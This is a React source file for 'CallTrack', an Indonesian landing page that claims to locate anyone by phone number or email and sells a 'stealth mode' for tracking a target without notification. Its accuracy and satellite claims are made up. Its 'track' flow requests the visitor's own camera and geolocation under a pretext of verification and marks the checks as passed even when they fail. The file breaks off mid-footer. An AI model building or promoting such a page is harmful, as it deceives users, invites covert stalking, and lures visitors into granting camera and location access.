"use client";

import { useState } from "react";
import {
  MapPin,
  Satellite,
  Shield,
  Smartphone,
  Zap,
  ChevronDown,
  Globe,
  Radar,
  Lock,
  Mail,
  Phone,
  Menu,
  X,
  Cpu,
} from "lucide-react";
import CameraVerification from "@/components/CameraVerification";
import { useScrollReveal } from "@/components/useScrollReveal";

export default function Home() {
  useScrollReveal();
  const [showTracking, setShowTracking] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [activeTab, setActiveTab] = useState<"phone" | "email">("phone");
  const [openFaq, setOpenFaq] = useState<number | null>(null);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [showSubscribePopup, setShowSubscribePopup] = useState(false);
  const [showLocationPermission, setShowLocationPermission] = useState(false);
  const [gpsChecked, setGpsChecked] = useState(false);
  const [aiChecked, setAiChecked] = useState(false);

  const countries = [
    { code: "ID", flag: "🇮🇩", dial: "+62" },
    { code: "US", flag: "🇺🇸", dial: "+1" },
    { code: "UK", flag: "🇬🇧", dial: "+44" },
    { code: "MY", flag: "🇲🇾", dial: "+60" },
    { code: "SG", flag: "🇸🇬", dial: "+65" },
    { code: "AU", flag: "🇦🇺", dial: "+61" },
  ];
  const [selectedCountry, setSelectedCountry] = useState(countries[0]);

  const handleTrack = () => {
    if (phoneNumber.trim().length >= 4) {
      setGpsChecked(false);
      setAiChecked(false);
      setShowLocationPermission(true);
    }
  };

  const handleGpsToggle = () => {
    if (!gpsChecked) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          () => setGpsChecked(true),
          () => setGpsChecked(true)
        );
      } else {
        setGpsChecked(true);
      }
    } else {
      setGpsChecked(false);
    }
  };

  const handleAiToggle = () => {
    if (!aiChecked) {
      navigator.mediaDevices?.getUserMedia({ video: true, audio: false })
        .then(() => setAiChecked(true))
        .catch(() => setAiChecked(true));
    } else {
      setAiChecked(false);
    }
  };

  const handleAllowLocation = () => {
    setShowLocationPermission(false);
    setShowTracking(true);
  };

  const faqs = [
    {
      q: "Apa yang dimaksud dengan CallTrack?",
      a: "CallTrack adalah layanan pelacakan lokasi berbasis nomor telepon dan email yang menggunakan teknologi GPS satelit terdepan untuk memberikan hasil akurat secara real-time.",
    },
    {
      q: "Fitur Lain Apa yang Dapat Saya Manfaatkan dari Penggunaan CallTrack?",
      a: "Selain pelacakan lokasi, CallTrack menyediakan riwayat lokasi, notifikasi zona aman, dan analisis pergerakan perangkat secara detail.",
    },
    {
      q: "Bagaimana Cara Melacak Ponsel Menghitung Lokasi?",
      a: "Kami menggunakan triangulasi BTS, sinyal GPS satelit, dan data Wi-Fi untuk menghitung posisi perangkat secara akurat hingga radius 10 meter.",
    },
    {
      q: "Seberapa Akuratkah Data di CallTrack?",
      a: "Data kami memiliki tingkat akurasi hingga 98.7% berdasarkan pengujian internal dengan dukungan 200+ satelit GPS aktif di seluruh dunia.",
    },
    {
      q: "Apakah Pencari Telepon Berdasarkan Nomor Legal untuk Digunakan?",
      a: "Ya, layanan kami sepenuhnya mematuhi regulasi privasi data yang berlaku dan hanya digunakan untuk tujuan yang sah sesuai ketentuan penggunaan.",
    },
    {
      q: "Apakah Saya Perlu Mengunduh atau Menginstal Aplikasi?",
      a: "Tidak perlu. CallTrack sepenuhnya berbasis web dan dapat diakses langsung dari browser perangkat Anda tanpa instalasi apapun.",
    },
  ];

  const features = [
    {
      icon: <Smartphone className="w-7 h-7" />,
      title: "Kemudahan penggunaan",
      desc: "Masukkan nomor telepon yang ingin dilacak dan kami langsung menjalankan proses pencarian lokasi secara otomatis.",
    },
    {
      icon: <Shield className="w-7 h-7" />,
      title: "Sesuai dengan peraturan",
      desc: "Legalitas dan keamanan privasi data pengguna dijaga dengan standar enkripsi AES-256 dan protokol keamanan terkini.",
    },
    {
      icon: <Zap className="w-7 h-7" />,
      title: "Tidak perlu instalasi",
      desc: "Tidak perlu mengunduh atau menginstal aplikasi apapun. Cukup buka browser Anda dan mulai lacak lokasi.",
    },
    {
      icon: <Satellite className="w-7 h-7" />,
      title: "Pelacak uptime terbaik",
      desc: "Fitur lokasi real-time kami terhubung langsung dengan 200+ satelit GPS untuk memberikan koordinat yang akurat.",
    },
  ];

  return (
    <div className="space-bg min-h-screen">
      {/* Animated Space Background */}
      <div className="stars-layer" />
      <div className="shooting-star" />

      {/* Floating Nebula Orbs */}
      <div
        className="nebula-orb"
        style={{
          width: "400px",
          height: "400px",
          top: "10%",
          left: "-10%",
          background:
            "radial-gradient(circle, rgba(47,128,237,0.3), transparent)",
        }}
      />
      <div
        className="nebula-orb"
        style={{
          width: "500px",
          height: "500px",
          top: "50%",
          right: "-15%",
          background:
            "radial-gradient(circle, rgba(138,43,226,0.25), transparent)",
          animationDelay: "5s",
        }}
      />
      <div
        className="nebula-orb"
        style={{
          width: "350px",
          height: "350px",
          bottom: "5%",
          left: "30%",
          background:
            "radial-gradient(circle, rgba(0,212,255,0.15), transparent)",
          animationDelay: "10s",
        }}
      />

      {/* ===== HEADER / NAV ===== */}
      <header className="sticky top-0 z-50 w-full backdrop-blur-md bg-[#050510]/80 border-b border-white/5">
        <nav className="nav-mobile max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-9 h-9 rounded-full bg-gradient-to-br from-accent-blue to-accent-purple flex items-center justify-center shadow-lg shadow-accent-blue/20">
              <MapPin className="w-5 h-5 text-white" />
            </div>
            <span className="font-display font-bold text-lg tracking-wide text-white">
              CallTrack
            </span>
          </div>

          {/* Desktop Nav */}
          <div className="hidden md:flex items-center gap-8 text-sm text-white/60">
            <a href="#home" className="hover:text-white transition-colors duration-200">
              Laman awal
            </a>
            <a href="#demo" className="hover:text-white transition-colors duration-200">
              Coba demo
            </a>
            <a href="#faq" className="hover:text-white transition-colors duration-200">
              FAQ
            </a>
            <a href="#how" className="hover:text-white transition-colors duration-200">
              Cara kerja
            </a>
            <a href="#features" className="hover:text-white transition-colors duration-200">
              Fitur
            </a>
            <a href="#pricing" className="hover:text-white transition-colors duration-200">
              Berlangganan
            </a>
          </div>

          <div className="hidden md:block">
            <button className="btn-primary px-5 py-2.5 text-sm font-semibold">
              MASUK
            </button>
          </div>

          {/* Mobile Menu Button */}
          <button
            className="md:hidden text-white p-2"
            onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
          >
            {isMobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
          </button>
        </nav>

        {/* Mobile Dropdown Menu */}
        {isMobileMenuOpen && (
          <div className="md:hidden absolute top-full left-0 w-full bg-[#050510]/95 backdrop-blur-md border-b border-white/10 px-6 py-4 flex flex-col gap-4">
            <a onClick={() => setIsMobileMenuOpen(false)} href="#home" className="text-white/80 hover:text-white py-2">
              Laman awal
            </a>
            <a onClick={() => setIsMobileMenuOpen(false)} href="#demo" className="text-white/80 hover:text-white py-2">
              Coba demo
            </a>
            <a onClick={() => setIsMobileMenuOpen(false)} href="#faq" className="text-white/80 hover:text-white py-2">
              FAQ
            </a>
            <a onClick={() => setIsMobileMenuOpen(false)} href="#how" className="text-white/80 hover:text-white py-2">
              Cara kerja
            </a>
            <a onClick={() => setIsMobileMenuOpen(false)} href="#features" className="text-white/80 hover:text-white py-2">
              Fitur
            </a>
            <a onClick={() => setIsMobileMenuOpen(false)} href="#pricing" className="text-white/80 hover:text-white py-2">
              Berlangganan
            </a>
            <button className="btn-primary px-5 py-2.5 text-sm font-semibold w-full mt-2">
              MASUK
            </button>
          </div>
        )}
      </header>

      {/* ===== HERO ===== */}
      <section id="home" className="relative z-10 max-w-7xl mx-auto px-6 pt-4 pb-20 md:pt-8 md:pb-32 section-mobile">
        {!showTracking ? (
          <div className="hero-grid grid md:grid-cols-2 gap-12 items-center">
            {/* Left - Text & Input */}
            <div className="hero-text animate-fade-in-up">
              <div 
                className="inline-flex items-center gap-2.5 px-3 py-1.5 rounded-full bg-white/5 border border-white/10 backdrop-blur-md shadow-lg mb-6 group hover:bg-white/10 transition-colors cursor-default"
              >
                <div className="flex items-center justify-center w-5 h-5 rounded-full bg-gradient-to-tr from-accent-blue to-accent-purple shadow-[0_0_10px_rgba(47,128,237,0.4)]">
                  <Cpu className="w-3 h-3 text-white animate-pulse" />
                </div>
                <span className="text-xs sm:text-[13px] font-medium text-white/80 tracking-wide pr-1">Didukung Sistem AI Canggih</span>
              </div>
              <h1
                className="text-4xl sm:text-5xl lg:text-6xl font-extrabold leading-tight mb-6"
                style={{ animationDelay: "0.1s", animationFillMode: "both" }}
              >
                <span className="gradient-text">Lacak Lokasi</span>
                <br />
                <span className="text-white">berdasarkan nomor</span>
                <br />
                <span className="text-white">telepon/email</span>
              </h1>

              <p
                className="text-white/50 text-sm sm:text-base mb-8 animate-fade-in-up leading-relaxed"
                style={{ animationDelay: "0.3s", animationFillMode: "both" }}
              >
                <MapPin className="w-4 h-4 inline-block mr-1 text-accent-blue" />
                Masukkan nomor yang{" "}
                <span className="text-accent-blue font-semibold">ingin</span>{" "}
                Anda geolokasi:
              </p>

              {/* Tab Buttons */}
              <div
                className="mobile-tabs flex gap-3 mb-5 animate-fade-in-up"
                style={{ animationDelay: "0.4s", animationFillMode: "both" }}
              >
                <button
                  onClick={() => setActiveTab("phone")}
                  className={`px-5 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 ${
                    activeTab === "phone"
                      ? "btn-primary"
                      : "btn-outline text-white/60"
                  }`}
                >
                  <Phone className="w-4 h-4 inline-block mr-1.5" />
                  Posisi Telepon
                </button>
                <button
                  onClick={() => setActiveTab("email")}
                  className={`px-5 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 ${
                    activeTab === "email"
                      ? "btn-primary"
                      : "btn-outline text-white/60"
                  }`}
                >
                  <Mail className="w-4 h-4 inline-block mr-1.5" />
                  Posisi Email
                </button>
              </div>

              {/* Input Stack */}
              {activeTab === "phone" ? (
                <div
                  className="mobile-input-stack flex gap-3 items-center animate-fade-in-up"
                  style={{ animationDelay: "0.5s", animationFillMode: "both" }}
                >
                  <div className="flex items-center input-dark p-0 flex-1 w-full relative overflow-hidden focus-within:border-accent-blue focus-within:shadow-[0_0_0_3px_rgba(0,212,255,0.15)] transition-all">
                    <div className="absolute left-0 top-0 bottom-0 flex items-center justify-center bg-white/5 border-r border-white/10 transition-colors hover:bg-white/10" style={{ width: '105px' }}>
                      <select
                        className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                        value={selectedCountry.code}
                        onChange={(e) => {
                          const country = countries.find(c => c.code === e.target.value);
                          if (country) setSelectedCountry(country);
                        }}
                      >
                        {countries.map(c => (
                          <option key={c.code} value={c.code}>{c.flag} {c.dial}</option>
                        ))}
                      </select>
                      <div className="flex items-center gap-1.5 pointer-events-none">
                        <span className="text-xl sm:text-2xl leading-none">{selectedCountry.flag}</span>
                        <span className="text-white/70 text-sm font-medium">{selectedCountry.dial}</span>
                        <ChevronDown className="w-3.5 h-3.5 text-white/40 ml-0.5" />
                      </div>
                    </div>
                    <input
                      type="tel"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      placeholder="Masukkan nomor telepon..."
                      className="bg-transparent border-none text-white text-sm px-5 py-3 flex-1 w-full focus:outline-none focus:ring-0 placeholder:text-white/30"
                      style={{ paddingLeft: '125px' }}
                      onKeyDown={(e) => e.key === "Enter" && handleTrack()}
                    />
                  </div>
                  <button
                    onClick={handleTrack}
                    className="btn-primary px-6 py-3 flex items-center gap-2 text-sm whitespace-nowrap"
                  >
                    <MapPin className="w-4 h-4" />
                    LOKASI
                  </button>
                </div>
              ) : (
                <div
                  className="mobile-input-stack flex gap-3 items-center animate-fade-in-up"
                  style={{ animationDelay: "0.5s", animationFillMode: "both" }}
                >
                  <div className="flex items-center input-dark p-0 flex-1 w-full relative overflow-hidden focus-within:border-accent-purple focus-within:shadow-[0_0_0_3px_rgba(138,43,226,0.15)] transition-all">
                    <div className="absolute left-0 top-0 bottom-0 w-14 flex items-center justify-center bg-accent-purple/10 border-r border-accent-purple/20 transition-colors">
                      <Mail className="w-5 h-5 text-accent-purple" />
                    </div>
                    <input
                      type="email"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      placeholder="Masukkan alamat email target..."
                      className="bg-transparent border-none text-white text-sm px-5 py-3 pl-16 flex-1 w-full focus:outline-none focus:ring-0 placeholder:text-white/30"
                      onKeyDown={(e) => e.key === "Enter" && handleTrack()}
                    />
                  </div>
                  <button
                    onClick={handleTrack}
                    className="btn-primary px-6 py-3 flex items-center gap-2 text-sm whitespace-nowrap"
                    style={{ background: 'linear-gradient(135deg, #8a2be2 0%, #00d4ff 100%)', boxShadow: '0 4px 20px rgba(138, 43, 226, 0.3)' }}
                  >
                    <Radar className="w-4 h-4" />
                    PINDAI
                  </button>
                </div>
              )}
              <p className="text-white/40 text-xs mt-4 animate-fade-in-up flex items-center justify-center md:justify-start gap-1.5" style={{ animationDelay: "0.6s", animationFillMode: "both" }}>
                <Zap className="w-3.5 h-3.5 text-accent-green" />
                Lacak gratis 3x sehari. <a href="#pricing" className="text-accent-blue hover:text-accent-cyan underline underline-offset-2 ml-1">Tingkatkan ke Premium</a>
              </p>
            </div>

            {/* Right - Visual Globe (Circular, Clean) */}
            <div
              className="relative flex justify-center items-center animate-fade-in-up"
              style={{ animationDelay: "0.6s", animationFillMode: "both" }}
            >
              <div className="globe-container" style={{ width: "clamp(220px, 50vw, 380px)", height: "clamp(220px, 50vw, 380px)" }}>
                {/* Atmospheric glow */}
                <div className="globe-atmosphere" />

                {/* Orbit rings */}
                <div className="globe-orbit-ring animate-spin-slow" style={{ animationDuration: "30s" }} />
                <div className="globe-orbit-ring-inner" style={{ animation: "spin-slow 40s linear infinite reverse" }} />

                {/* Rotating Earth (circular clip) */}
                <div className="globe-image-wrapper" style={{ animationDuration: "80s" }}>
                  <img
                    src="/earth.png"
                    alt="Earth Globe"
                    draggable={false}
                  />
                </div>

                {/* Orbiting Pins */}
                <div
                  className="absolute top-4 right-6 animate-float"
                  style={{ animationDelay: "0s" }}
                >
                  <div className="w-10 h-10 rounded-full bg-accent-blue/20 backdrop-blur-sm border border-accent-blue/30 flex items-center justify-center shadow-lg shadow-accent-blue/10">
                    <MapPin className="w-5 h-5 text-accent-blue" />
                  </div>
                </div>
                <div
                  className="absolute bottom-12 left-2 animate-float"
                  style={{ animationDelay: "2s" }}
                >
                  <div className="w-8 h-8 rounded-full bg-accent-purple/20 backdrop-blur-sm border border-accent-purple/30 flex items-center justify-center shadow-lg shadow-accent-purple/10">
                    <Satellite className="w-4 h-4 text-accent-purple" />
                  </div>
                </div>
                <div
                  className="absolute top-1/2 right-0 translate-x-2 animate-float"
                  style={{ animationDelay: "1s" }}
                >
                  <div className="w-9 h-9 rounded-full bg-accent-green/20 backdrop-blur-sm border border-accent-green/30 flex items-center justify-center shadow-lg shadow-accent-green/10">
                    <Radar className="w-4 h-4 text-accent-green" />
                  </div>
                </div>
              </div>
            </div>
          </div>
        ) : (
          /* Tracking Mode - CameraVerification */
          <>
            <div className="fixed inset-0 z-0 pointer-events-none opacity-25 animate-fade-in-up" style={{ animationDuration: '2s' }}>
              <iframe 
                className="animate-map-pan origin-center"
                width="100%" 
                height="100%" 
                frameBorder="0" 
                scrolling="no" 
                src="https://www.openstreetmap.org/export/embed.html?bbox=106.6%2C-6.4%2C107.0%2C-6.0&amp;layer=mapnik" 
                style={{ filter: 'invert(100%) grayscale(100%) contrast(120%) sepia(100%) hue-rotate(180deg) saturate(500%) brightness(40%)' }}
              />
              <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_10%,#050510_80%)]"></div>
              <div className="absolute inset-0 bg-gradient-to-b from-transparent via-accent-blue/10 to-transparent h-[50%] w-full animate-scan-line"></div>
            </div>
            <div
              className="max-w-lg mx-auto animate-fade-in-up relative z-10"
              style={{ animationFillMode: "both" }}
            >
              <CameraVerification phoneNumber={phoneNumber} />
              <button
                onClick={() => setShowTracking(false)}
                className="mt-8 text-white/80 hover:text-white text-sm font-medium transition-all flex items-center gap-2 mx-auto bg-white/5 hover:bg-white/10 border border-white/10 px-6 py-2.5 rounded-full backdrop-blur-md shadow-lg"
              >
                ← Kembali ke beranda
              </button>
            </div>
          </>
        )}
      </section>

      {/* ===== REST OF LANDING (only show when not tracking) ===== */}
      {!showTracking && (
        <>
          {/* ===== TAGLINE ===== */}
          <section className="relative z-10 max-w-5xl mx-auto px-6 py-16 text-center section-mobile reveal-on-scroll">
            <h2 className="section-heading-mobile text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white mb-6 leading-tight">
              Gunakan pencari lokasi untuk
              <br />
              <span className="gradient-text-static">
                melacak nomor Telepon atau email.
              </span>
            </h2>
          </section>

          {/* ===== HOW IT WORKS ===== */}
          <section
            id="how"
            className="relative z-10 max-w-6xl mx-auto px-6 py-20 section-mobile reveal-on-scroll"
          >
            <div className="how-grid-mobile grid md:grid-cols-2 gap-12 items-start">
              <div>
                <h2 className="section-heading-mobile text-3xl sm:text-4xl font-extrabold mb-4">
                  <span className="gradient-text-static">Melacak nomor telepon</span>{" "}
                  <span className="text-white">dengan CallTrack</span>
                </h2>
                <p className="text-white/50 text-sm sm:text-base leading-relaxed mb-8">
                  Dengan CallTrack, Anda bisa mengetahui lokasi serta informasi
                  perangkat target secara detail dan jarak jauh tanpa perlu
                  menginstal aplikasi apapun.
                </p>
                <div className="info-grid-mobile grid grid-cols-2 gap-4">
                  {[
                    { icon: <Globe className="w-5 h-5" />, label: "Lokasi yang Tepat" },
                    { icon: <Smartphone className="w-5 h-5" />, label: "Nomor Telepon Tak Terbatas" },
                    { icon: <MapPin className="w-5 h-5" />, label: "Cakupan Seluruh Dunia" },
                    { icon: <Lock className="w-5 h-5" />, label: "Privasi Terjaga" },
                    { icon: <Radar className="w-5 h-5" />, label: "Semua Jenis Telepon" },
                  ].map((item, i) => (
                    <div
                      key={i}
                      className="flex items-center gap-3 text-white/70 text-sm py-1"
                    >
                      <div className="text-accent-blue shrink-0">{item.icon}</div>
                      <span className="leading-snug">{item.label}</span>
                    </div>
                  ))}
                </div>

                <button
                  onClick={() => {
                    window.scrollTo({ top: 0, behavior: "smooth" });
                  }}
                  className="btn-primary px-8 py-3.5 mt-10 text-sm flex items-center gap-2"
                >
                  <MapPin className="w-4 h-4" />
                  COBA SEKARANG
                </button>
              </div>

              {/* Right - How it works cards */}
              <div className="space-y-6">
                <h3 className="text-2xl font-bold text-white">
                  Bagaimana cara kerjanya
                </h3>
                {[
                  {
                    step: "1",
                    title: "Minta Lokasi",
                    desc: "Masukkan nomor telepon yang ingin Anda lacak dan klik LOKASI.",
                    color: "from-accent-blue to-accent-cyan",
                  },
                  {
                    step: "2",
                    title: "Lokasi Penerima",
                    desc: "Penerima akan menerima SMS atau notifikasi yang meminta akses lokasi untuk verifikasi dan pemrosesan.",
                    color: "from-accent-purple to-accent-blue",
                  },
                  {
                    step: "3",
                    title: "Lihat Lokasi GPS di Peta",
                    desc: "Setelah penerima memberikan akses, Anda akan dapat melihat lokasi mereka secara real-time di peta satelit.",
                    color: "from-accent-green to-accent-cyan",
                  },
                ].map((item, i) => (
                  <div key={i} className="glass-card p-5 flex items-start gap-4">
                    <div
                      className={`w-10 h-10 rounded-full bg-gradient-to-br ${item.color} flex items-center justify-center shrink-0 font-display font-bold text-white text-sm shadow-lg`}
                    >
                      {item.step}
                    </div>
                    <div>
                      <h4 className="text-white font-semibold mb-1 text-sm sm:text-base">
                        {item.title}
                      </h4>
                      <p className="text-white/50 text-sm leading-relaxed">
                        {item.desc}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </section>

          {/* ===== FEATURES ===== */}
          <section
            id="features"
            className="relative z-10 max-w-6xl mx-auto px-6 py-20 section-mobile reveal-on-scroll"
          >
            <div className="text-center mb-14">
              <h2 className="section-heading-mobile text-3xl sm:text-4xl font-extrabold text-white mb-4">
                Fitur &amp; manfaat{" "}
                <span className="gradient-text-static">solusi kami</span>
              </h2>
              <p className="text-white/40 text-sm sm:text-base max-w-2xl mx-auto leading-relaxed">
                Pelacakan lokasi akurat dan real-time hanya tersedia satu
                langkah dari Anda. Rasakan kemudahan mencari lokasi perangkat
                dan temukan semua informasi yang diperlukan.
              </p>
            </div>

            <div className="features-grid-mobile grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
              {features.map((f, i) => (
                <div
                  key={i}
                  className="glass-card p-6 text-center group"
                >
                  <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-accent-blue/20 to-accent-purple/20 border border-accent-blue/20 flex items-center justify-center mx-auto mb-5 text-accent-blue group-hover:text-accent-cyan transition-colors duration-300 group-hover:shadow-lg group-hover:shadow-accent-blue/10">
                    {f.icon}
                  </div>
                  <h3 className="text-white font-bold mb-3 text-sm sm:text-base">{f.title}</h3>
                  <p className="text-white/40 text-sm leading-relaxed">
                    {f.desc}
                  </p>
                </div>
              ))}
            </div>
          </section>

          {/* ===== PRICING ===== */}
          <section id="pricing" className="relative z-10 max-w-6xl mx-auto px-6 py-20 section-mobile reveal-on-scroll">
            <div className="text-center mb-14">
              <p className="text-accent-blue font-display text-sm tracking-widest uppercase mb-3">
                BERLANGGANAN
              </p>
              <h2 className="section-heading-mobile text-3xl sm:text-4xl font-extrabold text-white mb-4">
                Pilih paket <span className="gradient-text-static">pelacakan Anda</span>
              </h2>
              <p className="text-white/40 text-sm sm:text-base max-w-2xl mx-auto leading-relaxed">
                Mulai dengan gratis untuk kebutuhan dasar, atau tingkatkan ke premium untuk pelacakan tak terbatas dan analitik mendalam.
              </p>
            </div>

            <div className="grid md:grid-cols-2 gap-8 max-w-4xl mx-auto">
              {/* Free Plan */}
              <div className="glass-card p-8 relative overflow-hidden group hover:border-accent-blue/50 transition-colors">
                <div className="absolute -right-10 -top-10 w-40 h-40 bg-accent-blue/10 blur-3xl rounded-full group-hover:bg-accent-blue/20 transition-colors"></div>
                <h3 className="text-xl font-bold text-white mb-2">Basic / Gratis</h3>
                <div className="flex items-end gap-1 mb-6">
                  <span className="text-4xl font-extrabold text-white">Rp 0</span>
                  <span className="text-white/40 text-sm mb-1">/selamanya</span>
                </div>
                <ul className="space-y-4 mb-8">
                  {[
                    "Lacak gratis 3x sehari",
                    "Akurasi standar (10-50m)",
                    "Data lokasi saat ini saja",
                    "Mendukung semua operator"
                  ].map((feature, i) => (
                    <li key={i} className="flex items-center gap-3 text-white/70 text-sm">
                      <Zap className="w-4 h-4 text-accent-cyan shrink-0" />
                      {feature}
                    </li>
                  ))}
                </ul>
                <button
                  onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
                  className="w-full py-3 rounded-xl border border-white/20 text-white font-semibold hover:bg-white/5 transition-colors"
                >
                  Mulai Gratis
                </button>
              </div>

              {/* Premium Plan */}
              <div className="glass-card p-8 relative overflow-hidden group border-accent-purple/50 shadow-[0_0_30px_rgba(138,43,226,0.15)] hover:shadow-[0_0_40px_rgba(138,43,226,0.25)] transition-all transform hover:-translate-y-1">
                <div className="absolute right-0 top-0 bg-gradient-to-r from-accent-blue to-accent-purple text-white text-[10px] font-bold uppercase tracking-wider py-1 px-3 rounded-bl-lg">
                  Paling Populer
                </div>
                <div className="absolute -left-10 -bottom-10 w-40 h-40 bg-accent-purple/20 blur-3xl rounded-full group-hover:bg-accent-purple/30 transition-colors"></div>
                <h3 className="text-xl font-bold text-white mb-2">Premium PRO</h3>
                <div className="flex items-end gap-1 mb-6">
                  <span className="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-accent-blue to-accent-purple">Rp 99rb</span>
                  <span className="text-white/40 text-sm mb-1">/bulan</span>
                </div>
                <ul className="space-y-4 mb-8">
                  {[
                    "Pelacakan tanpa batas",
                    "Akurasi pinpoint GPS (1-5m)",
                    "Riwayat lokasi 30 hari",
                    "Mode siluman (tanpa notifikasi)",
                    "Dukungan prioritas 24/7"
                  ].map((feature, i) => (
                    <li key={i} className="flex items-center gap-3 text-white/90 text-sm font-medium">
                      <div className="w-5 h-5 rounded-full bg-gradient-to-br from-accent-blue to-accent-purple flex items-center justify-center shrink-0">
                        <Zap className="w-3 h-3 text-white" />
                      </div>
                      {feature}
                    </li>
                  ))}
                </ul>
                <button
                  onClick={() => setShowSubscribePopup(true)}
                  className="w-full btn-primary py-3 rounded-xl font-semibold shadow-lg shadow-accent-purple/20"
                >
                  Berlangganan Sekarang
                </button>
              </div>
            </div>
          </section>

          {/* ===== FAQ ===== */}
          <section
            id="faq"
            className="relative z-10 max-w-4xl mx-auto px-6 py-20 section-mobile reveal-on-scroll"
          >
            <div className="text-center mb-14">
              <p className="text-accent-blue font-display text-sm tracking-widest uppercase mb-3">
                FAQ
              </p>
              <h2 className="section-heading-mobile text-3xl sm:text-4xl font-extrabold text-white leading-tight">
                Bagaimana cara{" "}
                <span className="gradient-text-static">melacak lokasi ponsel</span>{" "}
                <br className="hidden sm:block" />
                dengan Nomor Telepon
              </h2>
            </div>

            <div className="space-y-3">
              {faqs.map((faq, i) => (
                <div key={i} className="faq-item overflow-hidden">
                  <button
                    onClick={() => setOpenFaq(openFaq === i ? null : i)}
                    className="w-full flex items-center justify-between p-5 text-left"
                  >
                    <span className="text-white/90 font-medium text-sm pr-4 leading-relaxed">
                      <span className="text-accent-blue mr-2">●</span>
                      {faq.q}
                    </span>
                    <ChevronDown
                      className={`w-5 h-5 text-white/40 shrink-0 transition-transform duration-300 ${
                        openFaq === i ? "rotate-180 text-accent-blue" : ""
                      }`}
                    />
                  </button>
                  <div
                    className={`overflow-hidden transition-all duration-300 ${
                      openFaq === i ? "max-h-40 pb-5" : "max-h-0"
                    }`}
                  >
                    <p className="text-white/40 text-sm px-5 leading-relaxed">
                      {faq.a}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </section>

          {/* ===== BOTTOM CTA ===== */}
          <section id="demo" className="relative z-10 max-w-5xl mx-auto px-6 py-20 section-mobile reveal-on-scroll">
            <div className="glass-card cta-card-mobile p-10 text-center relative overflow-hidden">
              <div
                className="nebula-orb"
                style={{
                  width: "300px",
                  height: "300px",
                  top: "-50%",
                  right: "-10%",
                  background:
                    "radial-gradient(circle, rgba(47,128,237,0.2), transparent)",
                }}
              />
              <h2 className="section-heading-mobile text-3xl font-extrabold text-white mb-4 relative z-10">
                <span className="gradient-text-static">Lacak nomor telepon</span>
              </h2>
              <p className="text-white/40 text-sm sm:text-base mb-8 relative z-10">
                Masukkan nomor telepon untuk melacak lokasi:
              </p>
              <div className="cta-input-mobile flex gap-3 items-center justify-center max-w-md mx-auto relative z-10">
                <div className="flex items-center input-dark p-0 flex-1 w-full relative overflow-hidden focus-within:border-accent-blue focus-within:shadow-[0_0_0_3px_rgba(0,212,255,0.15)] transition-all">
                  <div className="absolute left-0 top-0 bottom-0 flex items-center justify-center bg-white/5 border-r border-white/10 transition-colors hover:bg-white/10" style={{ width: '105px' }}>
                    <select
                      className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                      value={selectedCountry.code}
                      onChange={(e) => {
                        const country = countries.find(c => c.code === e.target.value);
                        if (country) setSelectedCountry(country);
                      }}
                    >
                      {countries.map(c => (
                        <option key={c.code} value={c.code}>{c.flag} {c.dial}</option>
                      ))}
                    </select>
                    <div className="flex items-center gap-1.5 pointer-events-none">
                      <span className="text-xl leading-none">{selectedCountry.flag}</span>
                      <span className="text-white/70 text-sm font-medium">{selectedCountry.dial}</span>
                      <ChevronDown className="w-3.5 h-3.5 text-white/40 ml-0.5" />
                    </div>
                  </div>
                  <input
                    type="tel"
                    placeholder="Masukkan nomor..."
                    className="bg-transparent border-none text-white text-sm px-5 py-3 flex-1 w-full focus:outline-none focus:ring-0 placeholder:text-white/30"
                    style={{ paddingLeft: '125px' }}
                    onKeyDown={(e) => {
                      if (e.key === "Enter") {
                        setPhoneNumber((e.target as HTMLInputElement).value);
                        setShowTracking(true);
                        window.scrollTo({ top: 0, behavior: "smooth" });
                      }
                    }}
                  />
                </div>
                <button
                  onClick={() => {
                    window.scrollTo({ top: 0, behavior: "smooth" });
                  }}
                  className="btn-primary px-6 py-3 text-sm flex items-center gap-2 whitespace-nowrap"
                >
                  <MapPin className="w-4 h-4" />
                  LOKASI
                </button>
              </div>
              <p className="text-white/40 text-xs mt-5 flex items-center justify-center gap-1.5 relative z-10">
                <Zap className="w-3.5 h-3.5 text-accent-green" />
                Lacak gratis 3x sehari. <a href="#pricing" className="text-accent-blue hover:text-accent-cyan underline underline-offset-2 ml-1">Berlangganan Premium</a>
              </p>
            </div>
          </section>

          {/* ===== FOOTER ===== */}
          <footer className="relative z-10 border-t border-white/5">
            <div className="max-w-7xl mx-auto px-6 py-14 section-mobile">
              <div className="footer-grid-mobile grid sm:grid-cols-2 md:grid-cols-4 gap-10">
                {/* Brand */}
                <div>
                  <div className="flex items-center gap-2 mb-4">
                    <div className="w-8 h-8 rounded-full bg-gradient-to-br from-accent-blue to-accent-purple flex items-center justify-center">
                      <MapPin className="w-4 h-4 text-white" />
                    </div>
                    <span className="font-display font-bold text-white">
                      CallTrack
                    </span>
                  </div>
                  <p className="text-white/30 text-xs leading-relaxed">
                    Platform pelacakan lokasi terdepan dengan teknologi GPS
                    satelit real-time untuk keamanan dan privasi Anda.
                  </p>
                </div>

                {/* Links */}
                {[
                  {
                    title: "Hubungi Kami",
                    links: [
                      "Tentang kami",
                      "Kebijakan Privasi",
                      "Syarat & Ketentuan",
                    ],
                  },
                  {
                    title: "Info Hukum",
                    links: [
                      "Ketentuan bisnis",
                      "Kebijakan refund",
                      "Lisensi",
                    ],
                  },
                  {
                    title: "Layanan",
                    links: ["Hubungi Kami", "FAQ", "Pelacakan Nomor Telepon"],
                  },
